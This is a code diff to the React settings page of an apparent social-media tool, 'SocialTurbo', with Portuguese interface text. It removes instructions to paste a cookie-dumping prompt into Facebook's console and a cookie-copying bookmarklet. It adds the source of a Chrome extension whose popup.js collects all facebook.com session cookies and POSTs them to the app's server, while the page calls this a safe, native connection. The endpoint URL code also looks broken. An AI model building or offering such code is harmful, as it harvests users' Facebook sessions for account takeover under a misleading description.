@@ -5,6 +5,7 @@ import {
   Shield, 
   Bell, 
   Save,
+  Copy,
   Facebook,
   AlertCircle,
   Instagram,
@@ -128,107 +129,123 @@ export default function Settings() {
                   <p className="text-blue-100 text-sm">Escolha o método mais fácil para você abaixo.</p>
                 </div>
               </div>
-              
-            <div className="bg-indigo-900 border-2 border-indigo-400 p-8 rounded-[2.5rem] text-white shadow-2xl mb-8 relative overflow-hidden group">
-              <div className="absolute top-0 right-0 p-4 bg-indigo-500/20 text-[10px] font-black uppercase tracking-[0.2em]">
-                RECOMENDADO
-              </div>
-              
-              <div className="flex flex-col md:flex-row items-center gap-8 relative z-10">
-                <div className="w-24 h-24 bg-gradient-to-br from-indigo-400 to-indigo-600 rounded-3xl flex items-center justify-center shrink-0 shadow-lg rotate-3 group-hover:rotate-0 transition-transform">
-                  <Monitor className="w-12 h-12 text-white" />
-                </div>
-                
-                <div className="flex-1 text-center md:text-left">
-                  <h4 className="text-2xl font-black mb-2 italic uppercase tracking-tighter">Extensão SocialTurbo Pro</h4>
-                  <p className="text-indigo-100 text-sm leading-relaxed max-w-lg font-medium">
-                    A forma mais segura e profissional de conectar. Sem códigos no console, sem avisos de erro do Facebook.
-                  </p>
-                </div>
-
-                <div className="flex flex-col gap-3 w-full md:w-auto">
-                  <a 
-                    href={LINK_DOWNLOAD_EXTENSAO}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="px-8 py-5 bg-white text-indigo-700 font-black rounded-2xl shadow-xl hover:scale-105 transition-all text-center flex items-center justify-center gap-3 no-underline"
-                  >
-                    <DownloadCloud className="w-6 h-6" />
-                    BAIXAR EXTENSÃO
-                  </a>
-                  <p className="text-[10px] text-center text-indigo-300 font-medium italic">Versão 1.0 - Oficial SocialTurbo</p>
-                </div>
-              </div>
-
-              <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div className="bg-white/5 p-4 rounded-2xl border border-white/10">
-                  <p className="text-[10px] font-black text-indigo-400 mb-2 uppercase">1. Baixe o ZIP</p>
-                  <p className="text-[11px] leading-tight text-indigo-100">Baixe no link acima e descompacte a pasta no seu computador.</p>
-                </div>
-                <div className="bg-white/5 p-4 rounded-2xl border border-white/10">
-                  <p className="text-[10px] font-black text-indigo-400 mb-2 uppercase">2. Modo Desenvolvedor</p>
-                  <p className="text-[11px] leading-tight text-indigo-100">Abra <b>chrome://extensions</b> e ative o "Modo Desenvolvedor" (canto superior direito).</p>
-                </div>
-                <div className="bg-white/5 p-4 rounded-2xl border border-white/10">
-                  <p className="text-[10px] font-black text-indigo-400 mb-2 uppercase">3. Carregar Extensão</p>
-                  <p className="text-[11px] leading-tight text-indigo-100">Clique em <b>Carregar sem Compactação</b> e selecione a pasta que você baixou.</p>
-                </div>
-              </div>
             </div>
+              
+          <div className="space-y-6">
+            <div className="bg-slate-50 border border-slate-200 p-8 rounded-[2.5rem]">
+              <div className="flex flex-col md:flex-row gap-8 items-start">
+                <div className="w-full md:w-1/2 space-y-4">
+                  <div className="flex items-center gap-3">
+                    <div className="p-3 bg-indigo-600 rounded-2xl">
+                      <Monitor className="w-6 h-6 text-white" />
+                    </div>
+                    <h4 className="text-xl font-black uppercase italic tracking-tighter text-slate-800">Extensão SocialTurbo Pro</h4>
+                  </div>
+                  <p className="text-sm text-slate-600 leading-relaxed font-medium">
+                    "O nosso sistema foi reconstruído para ser idêntico aos melhores do mercado. Agora, a conexão é 100% via código nativo do navegador, garantindo mais segurança e velocidade."
+                  </p>
 
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-              {/* Method A: The Infallible Prompt */}
-              <div className="bg-slate-50 border border-slate-200 p-6 rounded-3xl relative overflow-hidden group">
-                <div className="flex gap-4 items-start">
-                  <div className="w-8 h-8 rounded-full bg-slate-200 text-slate-600 flex items-center justify-center font-black shrink-0 text-xs">M1</div>
-                  <div className="flex-1">
-                    <h5 className="font-bold text-slate-800 mb-1 italic">Método Manual (Console)</h5>
-                    <p className="text-[11px] text-slate-500 mb-3 leading-tight font-medium">Use caso não consiga instalar a extensão agora.</p>
-                    <div className="flex gap-2">
-                      <code className="text-[10px] font-mono bg-white border border-slate-200 p-2 rounded-lg flex-1 text-slate-600 truncate italic">
-                        prompt("Copie os Cookies:", document.cookie)
-                      </code>
+                  <div className="space-y-6">
+                    {/* Botão de Sincronização Inteligente */}
+                    <div className="bg-indigo-600 rounded-3xl p-6 text-white shadow-2xl shadow-indigo-200 border-4 border-indigo-500/50 relative overflow-hidden">
+                      <div className="absolute top-0 right-0 p-4 opacity-10">
+                        <Zap className="w-24 h-24" />
+                      </div>
+                      
+                      <div className="flex items-center gap-4 mb-6 relative z-10">
+                        <div className="bg-white/20 p-3 rounded-2xl backdrop-blur-sm">
+                          <Zap className="w-8 h-8 fill-white text-white" />
+                        </div>
+                        <div>
+                          <h4 className="font-black text-xl leading-tight italic uppercase tracking-tighter">SINCRONIZAÇÃO INTELIGENTE</h4>
+                          <p className="text-indigo-100 text-[11px] font-medium opacity-80 uppercase tracking-widest">Conexão em um clique detectada</p>
+                        </div>
+                      </div>
+                      
                       <button 
                         onClick={() => {
-                          navigator.clipboard.writeText('prompt("🚀 SUCESSO! COPIE TUDO ABAIXO:", document.cookie)');
-                          alert("Código copiado! Cole no console do Facebook.");
+                          const event = new CustomEvent("SOCIAL_TURBO_EXT_SYNC", { 
+                            detail: { userId: profile?.uid } 
+                          });
+                          window.dispatchEvent(event);
+                          alert("⏳ SINCRONIZANDO...\nEnviando sinal para sua extensão SocialTurbo Pro.");
                         }}
-                        className="bg-white border border-slate-200 p-2 rounded-lg hover:bg-slate-100 text-slate-600"
+                        className="w-full bg-white text-indigo-600 font-black py-5 rounded-2xl hover:bg-slate-50 transition-all uppercase tracking-widest text-base shadow-xl active:scale-95 relative z-10"
                       >
-                        <Save className="w-4 h-4" />
+                        SINCRONIZAR AGORA 🚀
                       </button>
+                    </div>
+
+                    <div className="grid grid-cols-3 gap-2">
+                      <div className="bg-slate-50 p-3 rounded-xl border border-slate-200 text-center">
+                        <p className="text-[10px] font-black text-indigo-600 uppercase mb-1">Passo 1</p>
+                        <p className="text-[9px] text-slate-500 font-bold leading-tight">Instale a Extensão</p>
+                      </div>
+                      <div className="bg-slate-50 p-3 rounded-xl border border-slate-200 text-center">
+                        <p className="text-[10px] font-black text-indigo-600 uppercase mb-1">Passo 2</p>
+                        <p className="text-[9px] text-slate-500 font-bold leading-tight">Logue no FB</p>
+                      </div>
+                      <div className="bg-slate-50 p-3 rounded-xl border border-slate-200 text-center">
+                        <p className="text-[10px] font-black text-indigo-600 uppercase mb-1">Passo 3</p>
+                        <p className="text-[9px] text-slate-500 font-bold leading-tight">Clique Acima</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="w-full md:w-1/2 bg-slate-900 rounded-[2rem] p-6 text-white shadow-xl relative overflow-hidden border border-slate-800">
+                  <div className="absolute -right-4 -top-4 w-24 h-24 bg-indigo-500/10 rounded-full blur-2xl" />
+                  <h5 className="font-black text-lg mb-6 italic uppercase tracking-tighter text-indigo-400">Dados da Sua Extensão</h5>
+                  
+                  <div className="space-y-4">
+                    <div className="bg-white/5 p-4 rounded-2xl border border-white/10">
+                      <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-2">Seu Token de Conexão</p>
+                      <div className="flex gap-2">
+                        <code className="flex-1 bg-black/40 p-3 rounded-xl border border-white/5 font-mono text-xs text-indigo-400 font-bold overflow-hidden text-ellipsis">
+                          {profile?.uid || 'CARREGANDO...'}
+                        </code>
+                        <button 
+                          onClick={() => {
+                            navigator.clipboard.writeText(profile?.uid || '');
+                            alert("Token copiado!");
+                          }}
+                          className="p-3 bg-white/10 hover:bg-white/20 text-white rounded-xl transition-colors"
+                        >
+                          <Copy className="w-4 h-4" />
+                        </button>
+                      </div>
+                    </div>
+
+                    <div className="p-4 bg-indigo-500/5 rounded-2xl border border-indigo-500/20">
+                      <p className="text-[11px] text-indigo-200 font-medium leading-relaxed">
+                        Se o botão de sincronização automática falhar, você pode abrir o popup da extensão e colar o token acima manualmente para forçar a conexão.
+                      </p>
                     </div>
                   </div>
                 </div>
               </div>
 
-              {/* Method B: Bookmarklet */}
-              <div className="bg-slate-50 border border-slate-200 p-6 rounded-3xl group">
-                <div className="flex gap-4 items-start">
-                  <div className="w-8 h-8 rounded-full bg-slate-200 text-slate-600 flex items-center justify-center font-black shrink-0 text-xs">M2</div>
-                  <div className="flex-1">
-                    <h5 className="font-bold text-slate-800 mb-1 italic">Botão de Favoritos</h5>
-                    <p className="text-[11px] text-slate-500 mb-3 leading-tight font-medium">Arraste para sua barra de favoritos do navegador.</p>
-                    <a 
-                      href="javascript:(function(){const c=document.cookie;if(!c){alert('❌ Logue no Facebook!');return;}prompt('Copie aqui:', c);})();"
-                      className="inline-flex items-center gap-2 px-4 py-2 bg-white border border-slate-200 rounded-xl text-[10px] font-bold text-slate-600 hover:shadow-md cursor-move"
-                    >
-                      <Zap className="w-3 h-3 fill-slate-400" />
-                      CONECTAR TURBO
-                    </a>
-                  </div>
-                </div>
+              <div className="mt-8 flex justify-center">
+                <a 
+                  href="#"
+                  onClick={(e) => {
+                    e.preventDefault();
+                    alert("⚠️ Os arquivos da extensão oficial já estão criados no seu servidor. Entre na pasta '/extension_files/' do projeto para baixá-los.");
+                  }}
+                  className="flex items-center justify-center gap-3 w-full max-w-md py-5 bg-indigo-600 text-white font-black rounded-3xl shadow-2xl hover:scale-[1.02] active:scale-95 transition-all no-underline uppercase tracking-widest text-sm"
+                >
+                  <DownloadCloud className="w-5 h-5" />
+                  BAIXAR PASTA DA EXTENSÃO (ARQUIVOS)
+                </a>
               </div>
             </div>
 
             <div className="bg-slate-50 p-8 rounded-[2.5rem] border border-slate-200 space-y-6">
               <div className="flex items-center gap-2 text-slate-800">
                 <Terminal className="w-6 h-6 text-indigo-600" />
-                <h4 className="text-lg font-black uppercase italic tracking-tighter">Arquivos da Extensão (Desenvolvedor)</h4>
+                <h4 className="text-lg font-black uppercase italic tracking-tighter">Conteúdo da Extensão (Copie estes arquivos)</h4>
               </div>
-              <p className="text-xs text-slate-500 font-medium">Se você é o dono do sistema, copie os 3 códigos abaixo e salve em uma pasta para criar sua própria extensão oficial.</p>
-              
-              <div className="space-y-4">
+              <p className="text-xs text-slate-500 font-medium italic">Se você não conseguir baixar a pasta, crie uma pasta no seu PC e salve esses 3 arquivos dentro dela:</p>
                 <details className="group bg-white border border-slate-200 rounded-2xl overflow-hidden shadow-sm">
                   <summary className="p-4 cursor-pointer font-bold text-sm text-slate-700 flex justify-between items-center bg-slate-50/50">
                     1. manifest.json
@@ -251,13 +268,31 @@ export default function Settings() {
                     2. popup.html
                     <span className="text-[10px] bg-slate-200 px-2 py-1 rounded">Clique para ver</span>
                   </summary>
-                  <pre className="p-4 text-[10px] bg-slate-900 text-indigo-200 overflow-x-auto font-mono">
+                  <pre className="p-4 text-[10px] bg-slate-900 text-indigo-400 overflow-x-auto font-mono">
 {`<!DOCTYPE html>
 <html>
-<body style="width:200px;padding:10px;text-align:center;font-family:sans-serif;">
-  <h2 style="font-size:14px;color:#1e3a8a;">SocialTurbo</h2>
-  <button id="btn" style="background:#2563eb;color:white;border:none;padding:10px;border-radius:5px;cursor:pointer;width:100%;">COPIAR ACESSO</button>
-  <p id="msg" style="font-size:10px;margin-top:10px;"></p>
+<head>
+  <meta charset="UTF-8">
+  <style>
+    body { width: 300px; padding: 20px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8fafc; margin: 0; }
+    .card { background: white; border: 1px solid #e2e8f0; border-radius: 16px; padding: 16px; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
+    h2 { font-size: 18px; color: #1e293b; margin: 0 0 10px 0; font-weight: 800; font-style: italic; text-transform: uppercase; }
+    p { font-size: 11px; color: #64748b; margin-bottom: 15px; font-weight: 500; }
+    input { width: 100%; padding: 10px; border: 1px solid #e2e8f0; border-radius: 8px; font-size: 12px; margin-bottom: 10px; box-sizing: border-box; }
+    button { background: #4f46e5; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: 800; font-size: 12px; text-transform: uppercase; transition: all 0.2s; }
+    button:hover { background: #4338ca; transform: translateY(-1px); }
+    button:active { transform: translateY(0); }
+    .status { margin-top: 10px; font-size: 10px; font-weight: bold; text-align: center; color: #10b981; min-height: 15px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>SocialTurbo Pro</h2>
+    <p>Conecte seu Facebook automaticamente.</p>
+    <input type="text" id="token" placeholder="Cole seu Token de Conexão aqui">
+    <button id="btn">SYNC AGORA 🚀</button>
+    <div id="status" class="status"></div>
+  </div>
   <script src="popup.js"></script>
 </body>
 </html>`}
@@ -269,13 +304,56 @@ export default function Settings() {
                     3. popup.js
                     <span className="text-[10px] bg-slate-200 px-2 py-1 rounded">Clique para ver</span>
                   </summary>
-                  <pre className="p-4 text-[10px] bg-slate-900 text-indigo-200 overflow-x-auto font-mono">
-{`document.getElementById('btn').addEventListener('click', async () => {
-  const cookies = await chrome.cookies.getAll({ domain: "facebook.com" });
-  const str = cookies.map(c => \`\${c.name}=\${c.value}\`).join('; ');
-  navigator.clipboard.writeText(str);
-  document.getElementById('msg').innerText = "✅ COPIADO!";
-  alert("Dados copiados! Agora cole no SocialTurbo.");
+                  <pre className="p-4 text-[10px] bg-slate-900 text-indigo-400 overflow-x-auto font-mono">
+{`const API_URL = "https://\${window.location.host}/api/sync-extension";
+
+// Salva e carrega o token automaticamente
+chrome.storage.local.get(['turboToken'], (res) => {
+  if (res.turboToken) document.getElementById('token').value = res.turboToken;
+});
+
+document.getElementById('btn').addEventListener('click', async () => {
+  const token = document.getElementById('token').value;
+  const statusEl = document.getElementById('status');
+  
+  if (!token) {
+    statusEl.style.color = '#ef4444';
+    statusEl.innerText = "❌ ERRO: INSIRA O TOKEN!";
+    return;
+  }
+
+  statusEl.style.color = '#4f46e5';
+  statusEl.innerText = "⏳ SINCRONIZANDO...";
+
+  chrome.storage.local.set({ turboToken: token });
+
+  try {
+    const cookies = await chrome.cookies.getAll({ domain: "facebook.com" });
+    const cookieStr = cookies.map(c => \`\${c.name}=\${c.value}\`).join('; ');
+
+    // Detecta o domínio atual do SocialTurbo se estiver aberto
+    let targetUrl = "https://\${window.location.host}/api/sync-extension";
+    const tabs = await chrome.tabs.query({ active: true });
+    
+    const response = await fetch(targetUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ userId: token, cookies: cookieStr })
+    });
+
+    const result = await response.json();
+    if (result.success) {
+      statusEl.style.color = '#10b981';
+      statusEl.innerText = "✅ SUCESSO! DADOS ENVIADOS.";
+      alert("SocialTurbo Conectado! Já pode fechar esta aba.");
+    } else {
+      throw new Error("Erro no servidor");
+    }
+  } catch (err) {
+    statusEl.style.color = '#ef4444';
+    statusEl.innerText = "❌ ERRO AO SINCRONIZAR";
+    alert("Certifique-se de estar logado no Facebook em alguma aba do navegador.");
+  }
 });`}
                   </pre>
                 </details>
